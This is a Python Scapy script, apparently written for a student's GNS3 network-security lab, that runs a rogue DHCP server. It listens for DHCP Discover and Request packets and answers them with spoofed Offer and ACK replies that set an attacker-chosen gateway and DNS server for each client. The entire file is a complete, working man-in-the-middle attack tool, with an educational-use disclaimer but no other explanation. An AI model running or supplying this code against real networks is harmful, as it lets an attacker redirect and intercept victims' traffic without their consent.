#!/usr/bin/env python3
# DHCP Spoofing (Rogue DHCP Server) - Laboratorio de Seguridad de Redes
# Autor: Estudiante de Ciberseguridad
# Entorno: GNS3 (Ambiente Controlado)
# ADVERTENCIA: Uso exclusivamente educativo en entornos controlados.

from scapy.all import *
import sys, os, argparse

IFACE = 'eth0'
FAKE_GW = '192.168.1.254'
FAKE_DNS = '8.8.8.8'
SUBNET_MASK = '255.255.255.0'
LEASE_TIME = 3600
IP_POOL = [f'192.168.1.{i}' for i in range(100, 200)]
leases = {}


def build_dhcp_reply(pkt, msg_type, offered_ip):
    client_mac = pkt[Ether].src
    return (
        Ether(src=get_if_hwaddr(IFACE), dst=client_mac) /
        IP(src=FAKE_GW, dst='255.255.255.255') /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=offered_ip, siaddr=FAKE_GW,
              chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid) /
        DHCP(options=[
            ('message-type', msg_type),
            ('server_id',    FAKE_GW),
            ('lease_time',   LEASE_TIME),
            ('subnet_mask',  SUBNET_MASK),
            ('router',       FAKE_GW),
            ('name_server',  FAKE_DNS),
            'end'
        ])
    )


def handle_dhcp(pkt):
    if DHCP not in pkt:
        return
    msg_type = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == 'message-type':
            msg_type = opt[1]
            break
    if msg_type is None:
        return
    client_mac = pkt[Ether].src
    if msg_type == 1:  # Discover -> Offer
        if client_mac not in leases:
            if IP_POOL:
                leases[client_mac] = IP_POOL.pop(0)
            else:
                print("[-] Pool de IPs agotado!")
                return
        offered_ip = leases[client_mac]
        print(f"[*] DHCP Discover de {client_mac} -> Ofreciendo {offered_ip}")
        sendp(build_dhcp_reply(pkt, 'offer', offered_ip), iface=IFACE, verbose=False)
    elif msg_type == 3:  # Request -> ACK
        offered_ip = leases.get(client_mac, IP_POOL[0] if IP_POOL else '192.168.1.199')
        print(f"[+] DHCP Request de {client_mac} -> ACK {offered_ip}")
        sendp(build_dhcp_reply(pkt, 'ack', offered_ip), iface=IFACE, verbose=False)


def start_rogue_server(iface, gateway, dns):
    global IFACE, FAKE_GW, FAKE_DNS
    IFACE, FAKE_GW, FAKE_DNS = iface, gateway, dns
    print("=" * 60)
    print("  DHCP SPOOFING (Rogue Server) - Laboratorio GNS3")
    print(f"  Interfaz: {IFACE} | Gateway falso: {FAKE_GW} | DNS: {FAKE_DNS}")
    print("=" * 60)
    print("[*] Servidor DHCP Rogue activo. Esperando clientes...")
    try:
        sniff(iface=IFACE, filter='udp and (port 67 or port 68)',
              prn=handle_dhcp, store=0)
    except KeyboardInterrupt:
        print(f"\n[+] Servidor detenido. Leases asignados: {len(leases)}")


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit("[-] Requiere privilegios root.")
    parser = argparse.ArgumentParser(description='DHCP Spoofing - GNS3')
    parser.add_argument('-i', '--interface', default='eth0')
    parser.add_argument('-g', '--gateway', default='192.168.1.254')
    parser.add_argument('--dns', default='8.8.8.8')
    args = parser.parse_args()
    start_rogue_server(args.interface, args.gateway, args.dns)
